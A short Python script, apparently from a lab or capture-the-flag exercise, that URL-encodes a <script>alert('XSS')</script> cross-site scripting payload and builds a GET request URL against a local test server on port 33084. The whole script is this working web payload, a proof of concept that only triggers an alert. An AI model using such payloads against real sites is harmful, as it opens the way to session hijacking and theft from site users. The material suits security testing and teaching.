import urllib.parse

# Raw payload with uppercase 'XSS'
raw_payload = "<script>alert('XSS')</script>"

# URL encode for GET parameter
encoded_payload = urllib.parse.quote(raw_payload, safe='')

# Construct full URL
base_url = "http://127.0.0.1:33084/page"
full_url = f"{base_url}?name={encoded_payload}"

# Verify encoding
print("=" * 60)
print("XSS PAYLOAD GENERATION AND ENCODING")
print("=" * 60)
print(f"\n[1] Raw payload:")
print(f"    {raw_payload}")
print(f"\n[2] URL-encoded for GET parameter:")
print(f"    {encoded_payload}")
print(f"\n[3] Full target URL:")
print(f"    {full_url}")
print(f"\n[4] Encoding verification:")
print(f"    Characters requiring encoding: {len([c for c in raw_payload if not c.isalnum() and c not in '-_.~'])}")
print(f"    Encoded length: {len(encoded_payload)} characters")
print(f"    Raw length: {len(raw_payload)} characters")
print("\n" + "=" * 60)
print("Payload ready for GET request")
print("=" * 60)
